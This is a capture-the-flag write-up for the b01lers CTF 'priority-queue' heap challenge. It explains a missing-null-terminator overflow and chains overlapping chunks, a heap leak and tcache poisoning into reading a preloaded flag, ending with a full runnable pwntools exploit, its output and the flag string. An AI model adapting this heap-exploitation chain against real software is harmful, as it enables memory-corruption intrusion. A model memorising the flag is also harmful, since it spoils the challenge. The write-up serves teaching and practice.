# priority-queue - b01lers CTF 2026 Writeup

**Description:** "Anything but paying attention during DSA lecture...
ncat --ssl priority-queue.opus4-7.b01le.rs 8443"


## 1 TL;DR
Exploited a heap buffer overflow in the `edit()` function caused by `read()` lacking null-termination. This allowed us to overwrite an adjacent chunk's size, create overlapping chunks, leak the heap base, and execute a **Tcache poisoning** attack. By pointing a poisoned chunk to the queue's array pointer, we replaced `array[0]` with the address of the pre-loaded flag chunk, printing it directly via the `peek()` function.

## 2. What Data/Files We Have & What is Special
**Provided Files:**
* `chall` (The vulnerable binary)
* `chall.c` (Source code)
* `libc.so.6` & `ld-linux-x86-64.so.2` (Glibc environment)
* `Dockerfile` (Environment setup)

**Security Protections (Checksec):**
* **Arch:** amd64-64-little
* **RELRO:** Partial RELRO
* **Stack:** No canary found
* **NX:** NX enabled
* **PIE:** PIE enabled

**The Interactive Interface:**
Upon connecting to the server, we are greeted with a standard heap-note-style priority queue interface:
```text
=== Welcome to the priority queue interface ===
Operation (insert/delete/peek/edit/count/quit): 
```
The operations manipulate a Min-Heap (Priority Queue) based on `strcmp()`.

**What is Special?**
1. **Pre-loaded Flag:** At the very beginning of `main()`, the binary reads `flag.txt` into a `malloc(100)` chunk. The flag is already sitting on the heap!
2. **Deterministic Heap Layout:** Because standard buffering is disabled with `setbuf(stdin, NULL)`, the heap allocations at startup are highly predictable: `fopen` structs -> `flag` chunk -> `fgets` buffers -> `array` chunks.

## 3. Problem Analysis (In Details)
Analyzing `chall.c` reveals a critical flaw in how chunks are updated. 
When we allocate a string via `insert()`:
```c
char buffer[128] = { 0 };
scanf("%127s", buffer);
char *chunk = malloc(strlen(buffer) + 1);
strcpy(chunk, buffer);
```
If we insert a 23-byte string, `malloc(24)` is called. The GLIBC heap allocator rounds this up to a **0x20** byte chunk (8 bytes metadata + 24 bytes usable). 

However, look at the `edit()` function:
```c
void edit(void) {
    if (size == 0) return;
    puts("Message: ");
    read(fileno(stdin), array[0], 32);
    move_down(0);
}
```
`edit()` forcefully reads **32 bytes** into the chunk, regardless of its allocated size, and `read()` does **not** append a null terminator. 
Since our user data only holds 24 bytes, the remaining 8 bytes will spill over and **overwrite the size metadata** of the adjacent chunk on the heap!

## 4. Initial Guesses / First Try
* **First thought:** Can we just overflow to overwrite a function pointer? No, it's the heap. 
* **Second thought:** Fastbin dup or standard UAF? No direct UAF is exposed initially, but since we can overwrite the `size` field of the next chunk, we can easily fake chunk boundaries.
* By extending the size of a chunk, we can free it so it overlaps with the chunk after it. This leads directly to **Overlapping Chunks**, which makes leaking addresses and performing Tcache poisoning trivial.

## 5. Exploitation Walkthrough / Flag Recovery

### Step 1: Heap Setup and Buffer Overflow
We allocate 4 identical chunks (`A`, `B`, `C`, `D`) of 24 bytes (0x20 chunk size).
```text
[ Chunk A (0x20) ] -> [ Chunk B (0x20) ] ->[ Chunk C (0x20) ] -> [ Chunk D (0x20) ]
```
We use `edit()` on chunk `B` to write 32 bytes. The 24 bytes fill the data region, and the last 8 bytes overwrite chunk `C`'s size field, changing it from `0x21` to `0x31`. 
Chunk `B` now conceptually "swallows" chunk `C`.

### Step 2: The Heap Leak
We arrange the Priority queue to bring `D`, `C`, and `B` to the top and free them in order. 
When `C` is freed, it gets a forward pointer (`fd`) pointing to `D`.
We then reallocate `B` via `insert()`. Since `B` overlaps `C`, we can use `edit()` to write exactly 32 bytes. Because `read()` doesn't null-terminate, the 32nd byte touches the `fd` pointer of `C`. Calling `peek()` prints our string *plus* the leaked `fd` pointer!

With the leaked heap address, we can calculate the exact location of the `array` chunk and the `flag` chunk, because the heap layout is entirely deterministic.
```python
d_addr = u64(fd_raw.ljust(8, b'\0'))
array_addr = d_addr - 0xb0
flag_addr = d_addr - 0x120
```

### Step 3: Tcache Poisoning
We free our overlapping chunk `B` again to push it back into the tcache. We allocate it once more, but this time our payload overwrites `C`'s `fd` pointer with `target_addr` (`array_addr - 0x10`).

### Step 4: Overwriting the Queue Array
We perform two allocations. The first consumes `C`. The second is served at `array_addr - 0x10`. 
By writing padding + `flag_addr` into this new chunk, we perfectly overwrite `array[0]` (the root of the Min-Heap) with the pointer to the pre-loaded flag.

### Step 5: Read the Flag
Since `array[0]` now points to the flag string, executing `peek()` dumps the flag!

### Exploit Script (`solve.py`)
```python
#!/usr/bin/env python3
# Complete, runnable Python script for 'priority-queue'
from pwn import *
import time

def solve():
    # To run locally, swap comments:
    # p = process('./chall_patched_patched')
    p = remote('priority-queue.opus4-7.b01le.rs', 8443, ssl=True)

    def insert(msg):
        p.sendlineafter(b"quit): \n", b"insert")
        p.sendlineafter(b"Message: \n", msg)

    def delete():
        p.sendlineafter(b"quit): \n", b"delete")
        return p.recvline()

    def peek():
        p.sendlineafter(b"quit): \n", b"peek")
        return p.recvline()

    def edit(msg):
        p.sendlineafter(b"quit): \n", b"edit")
        p.sendafter(b"Message: \n", msg)

    print("[*] Inserting chunks A, B, C, D...")
    insert(b"A" * 23)
    insert(b"B" * 23)
    insert(b"C" * 23)
    insert(b"D" * 23)

    print("[*] Corrupting B's size to overlap C...")
    # Overwrite B's size to 0x31, and change A to "Z" so it moves to bottom of min-heap
    edit(b"Z" * 24 + p64(0x31))

    print("[*] Adjusting priority queue to free D, C, B...")
    edit(b"Y" * 23 + b"\n")
    edit(b"X" * 23 + b"\n")

    print("[*] Freeing D, C, B...")
    delete() # Frees D
    delete() # Frees C (C->fd points to D)
    delete() # Frees B (goes to 0x30 tcache, overlapping C)

    print("[*] Reallocating B to leak heap base...")
    # malloc(32) -> gets the 0x30 chunk (B). scanf writes a null byte at index 31.
    insert(b"E" * 31)

    print("[*] Overwriting B's null byte to leak C->fd...")
    # edit writes exactly 32 bytes without appending nulls, touching right up to C->fd
    edit(b"F" * 32)

    leak = peek()
    idx = leak.find(b"F" * 32)
    if idx == -1:
        print("[-] Leak failed!")
        p.close()
        return False

    fd_raw = leak[idx+32 : idx+32+6]
    d_addr = u64(fd_raw.ljust(8, b'\0'))
    print(f"[+] Leaked heap address (D_addr): {hex(d_addr)}")

    array_addr = d_addr - 0xb0
    flag_addr = d_addr - 0x120
    print(f"[+] array chunk: {hex(array_addr)}")
    print(f"[+] flag chunk: {hex(flag_addr)}")

    target_addr = array_addr - 0x10

    # Ensure ASLR hasn't given us whitespace bytes that break scanf("%127s")
    def has_whitespace(addr):
        addr_bytes = p64(addr).strip(b'\x00')
        return any(b in b" \t\n\r\x0b\x0c" for b in addr_bytes)

    if has_whitespace(target_addr) or has_whitespace(flag_addr):
        print("[-] ASLR generated whitespace in target address. Run again!")
        p.close()
        return False

    print("[*] Freeing B_new back to tcache...")
    delete()

    print("[*] Executing Tcache poisoning...")
    # Overwrite C->fd with target_addr
    payload = b"E" * 16 + b"X" * 8 + b"Y" * 8 + p64(target_addr).strip(b'\x00')
    insert(payload)

    print("[*] Allocating C_new...")
    insert(b"y") # Consumes C

    print("[*] Overwriting array[0] with flag_addr...")
    # target_addr maps over array_addr - 0x10.
    # The payload writes 16 bytes of "z" into the chunk header, and `flag_addr` perfectly into array[0].
    # Using 'z' ensures it stays out of the way for priority queue's move_up swap operations.
    target_payload = b"z" * 16 + p64(flag_addr).strip(b'\x00')
    insert(target_payload)

    print("[*] Extracting FLAG...")
    flag_data = peek()
    print(f"\n[FLAG] {flag_data.decode(errors='ignore').strip()}\n")
    p.close()
    return True

if __name__ == "__main__":
    # Wrap in a loop just in case ASLR generates a \x20 byte in the calculated addresses.
    while not solve():
        time.sleep(1)
```

**Output:**
```text
[+] Opening connection to priority-queue.opus4-7.b01le.rs on port 8443: Done
[*] Inserting chunks A, B, C, D...
[*] Corrupting B's size to overlap C...
[*] Adjusting priority queue to free D, C, B...
[*] Freeing D, C, B...
[*] Reallocating B to leak heap base...
[*] Overwriting B's null byte to leak C->fd...
[*] Freeing B_new back to tcache...
[*] Executing Tcache poisoning...
[*] Allocating C_new...
[*] Overwriting array[0] with flag_addr...
[*] Extracting FLAG...

[FLAG] bctf{u53_4ft3r_fr33_f4n_v5_0v3rl4pp1n6_4110c4t10n5_3nj0y3r_8c6fd0b452}
```

## 6. What We Learned
1. **Never use `read()` for strings unless you explicitly append a null terminator (`\0`).** The absence of the null byte not only created a buffer overflow into the heap metadata, but it also enabled us to seamlessly leak memory pointers when combined with `puts()`.
2. **Heap Memory layouts are highly deterministic** prior to user interaction if ASLR is the only defense. Since the `flag.txt` was loaded at initialization, calculating the exact offset from our dynamically allocated chunks to the flag pointer was a static math equation.